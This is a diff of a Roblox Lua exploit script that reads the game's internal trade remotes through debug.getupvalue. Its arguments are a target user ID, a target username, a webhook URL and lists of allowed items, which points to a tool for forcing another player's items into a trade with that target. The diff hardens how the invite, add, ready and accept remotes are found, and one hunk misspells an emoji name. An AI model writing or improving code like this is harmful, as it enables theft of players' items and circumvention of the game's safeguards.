@@ -4,6 +4,7 @@
   Args: targetUserId, targetUsername, webhookUrl, allowedAnimals, allowedBaseSkins, allowedGears
   [FIXED] Trade_%* format bug, HTTP timeouts, nil checks, infinite loop guards
   [REMOVED] Priority/dual invite system (MISS_TARGET_ID, PRIORITY_BRAINROTS, priority embed)
+  [UPDATED] Remotes resolved via name-based upvalue scan (no hardcoded indexes)
 ]]
 
 return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowedBaseSkins, allowedGears)
@@ -100,29 +101,150 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	allowedBaseSkins = allowedBaseSkins or {}
 	allowedGears = allowedGears or {}
 
-	-- Trade remotes resolved via getupvalue
+	-- Trade remotes resolved via name-based upvalue scan (no hardcoded indexes)
 	local liveTrade, inviteRemote, addBrainrotRemote, addItemRemote
 	local readyRemote, acceptRemote, tradeEndRemote
 
+	-- Scan fn's upvalues, return first remote whose name matches predicate
+	local function scanRemoteByName(fn, predicate, maxScan)
+		maxScan = maxScan or 50
+		if type(fn) ~= "function" then return nil end
+		for i = 1, maxScan do
+			local ok, _, val = pcall(debug.getupvalue, fn, i)
+			if not ok or val == nil then break end
+			if typeof(val) == "Instance"
+				and (val:IsA("RemoteEvent") or val:IsA("RemoteFunction"))
+			then
+				local ok2, matched = pcall(predicate, val.Name or "", val, i)
+				if ok2 and matched then
+					return val
+				end
+			end
+		end
+		return nil
+	end
+
+	-- Scan fn's upvalues, return first remote (used for Add funcs that hold exactly one)
+	local function scanFirstRemote(fn, maxScan)
+		maxScan = maxScan or 20
+		if type(fn) ~= "function" then return nil end
+		for i = 1, maxScan do
+			local ok, _, val = pcall(debug.getupvalue, fn, i)
+			if not ok or val == nil then break end
+			if typeof(val) == "Instance"
+				and (val:IsA("RemoteEvent") or val:IsA("RemoteFunction"))
+			then
+				return val
+			end
+		end
+		return nil
+	end
+
+	-- Scan fn's upvalues, return first table with both .Brainrot and .BaseSkin
+	local function scanLiveTrade(fn, maxScan)
+		maxScan = maxScan or 50
+		if type(fn) ~= "function" then return nil end
+		for i = 1, maxScan do
+			local ok, _, val = pcall(debug.getupvalue, fn, i)
+			if not ok or val == nil then break end
+			if type(val) == "table"
+				and type(rawget(val, "Brainrot")) == "table"
+				and type(rawget(val, "BaseSkin")) == "table"
+			then
+				return val
+			end
+		end
+		return nil
+	end
+
 	task.spawn(function()
-		local getUpvalueFunc = debug.getupvalue or getupvalue
 		local t0 = tick()
-		-- [FIX] Add timeout to prevent infinite loop
 		while tick() - t0 < 15 do
 			pcall(function()
-				liveTrade = getUpvalueFunc(TradeController._createLiveTrade, 15)
-				inviteRemote = getUpvalueFunc(TradeController.SendInvite, 1)
-				if liveTrade then
-					if liveTrade.Brainrot and liveTrade.Brainrot.Add then
-						addBrainrotRemote = getUpvalueFunc(liveTrade.Brainrot.Add, 1)
-					end
-					if liveTrade.BaseSkin and liveTrade.BaseSkin.Add then
-						addItemRemote = getUpvalueFunc(liveTrade.BaseSkin.Add, 1)
+				if not liveTrade then
+					liveTrade = scanLiveTrade(TradeController._createLiveTrade)
+				end
+
+				if not inviteRemote then
+					inviteRemote = scanRemoteByName(
+						TradeController.SendInvite,
+						function(name)
+							return name:lower():find("invite", 1, true) ~= nil
+						end
+					)
+					if not inviteRemote then
+						inviteRemote = scanFirstRemote(TradeController.SendInvite, 10)
 					end
 				end
-				readyRemote = getUpvalueFunc(TradeController._createLiveTrade, 24)
-				acceptRemote = getUpvalueFunc(TradeController._createLiveTrade, 23)
-				tradeEndRemote = getUpvalueFunc(TradeController._createPlayerList, 21)
+
+				if not readyRemote then
+					readyRemote = scanRemoteByName(
+						TradeController._createLiveTrade,
+						function(name)
+							return name:lower():find("ready", 1, true) ~= nil
+						end
+					)
+				end
+
+				if not acceptRemote then
+					acceptRemote = scanRemoteByName(
+						TradeController._createLiveTrade,
+						function(name)
+							return name:lower():find("accept", 1, true) ~= nil
+						end
+					)
+				end
+
+				if not tradeEndRemote then
+					tradeEndRemote = scanRemoteByName(
+						TradeController._createPlayerList,
+						function(name)
+							local l = name:lower()
+							return l:find("tradeend", 1, true) ~= nil
+								or l:find("end", 1, true) ~= nil
+								or l:find("trade", 1, true) ~= nil
+						end
+					)
+				end
+
+				if liveTrade
+					and liveTrade.Brainrot
+					and liveTrade.Brainrot.Add
+					and not addBrainrotRemote
+				then
+					addBrainrotRemote = scanRemoteByName(
+						liveTrade.Brainrot.Add,
+						function(name)
+							local l = name:lower()
+							return l:find("brainrot", 1, true) ~= nil
+								or l:find("addbrain", 1, true) ~= nil
+								or l:find("add", 1, true) ~= nil
+						end
+					)
+					if not addBrainrotRemote then
+						addBrainrotRemote = scanFirstRemote(liveTrade.Brainrot.Add)
+					end
+				end
+
+				if liveTrade
+					and liveTrade.BaseSkin
+					and liveTrade.BaseSkin.Add
+					and not addItemRemote
+				then
+					addItemRemote = scanRemoteByName(
+						liveTrade.BaseSkin.Add,
+						function(name)
+							local l = name:lower()
+							return l:find("item", 1, true) ~= nil
+								or l:find("baseskin", 1, true) ~= nil
+								or l:find("additem", 1, true) ~= nil
+								or l:find("add", 1, true) ~= nil
+						end
+					)
+					if not addItemRemote then
+						addItemRemote = scanFirstRemote(liveTrade.BaseSkin.Add)
+					end
+				end
 			end)
 			if liveTrade and inviteRemote and addBrainrotRemote and addItemRemote
 				and readyRemote and acceptRemote and tradeEndRemote
@@ -163,7 +285,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		["Bloodmoon Hammer"] = "<:gearbloodmoonhammer:1536941316087222303>",
 		["Bloodmoon Slap"] = "<:gearbloodmoonslap:1536941363260821644>",
 		["Cupid's Wings"] = "<:gearcupidswings:1536941473407176715>",
-		["Cursed Slap"] = "<:gearcursedslap:1536941510824689764>",
+		["Cursed Slap"] = "<:gearcurssedslap:1536941510824689764>",
 		["Cyber Slap"] = "<:gearcyberslap:1536941541971730483>",
 		["Demon's Head"] = "<:geardemonshead:1536941574028525649>",
 		["Divine Slap"] = "<:geardivineslap:1536941781277741076>",
